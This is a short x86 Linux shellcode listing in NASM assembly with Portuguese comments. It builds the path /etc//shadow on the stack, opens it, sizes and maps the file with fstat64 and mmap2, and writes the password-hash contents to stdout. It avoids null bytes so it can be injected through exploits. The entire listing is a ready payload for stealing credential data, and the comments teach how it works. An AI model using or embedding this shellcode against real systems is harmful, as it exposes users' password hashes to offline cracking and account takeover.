section .text
	global _start

_start:
xor eax, eax
xor ecx, ecx ; zerando eax, ecx e edx, pra nao dar erro
cdq

mov al, 5 ; coloca em eax o numero 5

push ecx ; joga 0x00000000 na stack
push 0x776f6461 ; escreve /etc//shadow, ao contrario, pq a stack é um sistema LIFO
push 0x68732f2f ; LIFO = last-in first-out, primeiro a entrar ultimo a sair
push 0x6374652f

mov ebx, esp

int 0x80 ; executa a system call

; fstat64

mov ebx, eax ; move o resultado da system call open para ebx
mov al, 197  ; fstat64
mov ecx, esp ; move o endereço do esp para ecx

int 0x80

; mmap2

mov dword ecx, [ esp+44 ] ; tamanho do arquivo
mov al,	192 ; mmap2 system call	number
mov edi, ebx ; move o fd pra edi

xor ebx, ebx
xor edx, edx
xor ebp, ebp
inc edx ; PROT_READ

push byte 2 ; MAP_PRIVATE
pop esi

int 0x80

; write

mov edx, ecx ; tamanho do arquivo em edx
mov ecx, eax ; move o resultado de mmap2 para ecx

xor eax, eax
mov al, 4; sys_write
inc ebx; 1 = stdout

int 0x80

; close

xor eax, eax
mov al, 6; sys_close
mov ebx, edi

int 0x80

